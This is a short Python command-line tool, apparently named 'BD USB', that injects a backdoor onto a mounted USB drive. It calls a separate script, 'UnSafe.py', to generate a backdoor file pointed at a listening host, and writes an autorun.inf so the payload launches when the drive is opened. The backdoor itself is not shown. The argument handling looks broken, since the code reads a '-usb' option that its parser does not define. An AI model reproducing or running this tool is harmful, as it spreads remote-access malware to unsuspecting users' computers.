try:
    import os, time, sys, argparse
    def cli():
        global args
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '-usb', help="USB To inject Backdoor to. USB Needs to be mounted!\nHow to mount USB: pmount /dev/sda2")
        parser.add_argument('-l', '--lhost', help="Listen HOST For the backdoor\nE.G.: 192.168.1.3")
        args = parser.parse_args()
    def print_red(msg):
        print(bcolors.FAIL + msg + bcolors.ENDC)
    def print_yellow(text):
        print(bcolors.WARNING + text + bcolors.ENDC)
    def print_green(txt):
        print(bcolors.OKGREEN + txt + bcolors.ENDC)
    def print_blue(text):
        print(bcolors.OKBLUE + text + bcolors.ENDC)
    class bcolors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
    class welcome:
        def __init__(self):
            pass
        @classmethod
        def hello(self):
            print_yellow("""             
            ____________   _   _ ___________ 
            | ___ \  _  \ | | | /  ___| ___ \\
            | |_/ / | | | | | | \ `--.| |_/ /
            | ___ \ | | | | | | |`--. \ ___ \\
            | |_/ / |/ /  | |_| /\__/ / |_/ /
            \____/|___/    \___/\____/\____/ 
                                     
                                    
    """)
    def inject_backdoor():
        os.chdir('Un-Safe')
        os.system("python UnSafe.py %s/run.py %s" % (str(args.usb), str(args.lhost)))
        autorun = """
[autorun] 
open=run.py 
icon=run.py,1
"""
        f = open(str(args.usb) + "/autorun.inf", "w")
        f.write(autorun)
    def run():
        welcome.hello()
        cli()
        inject_backdoor()
    if __name__ == '__main__':
        run()
except Exception as e:
    print_red("An error occured, " + str(e))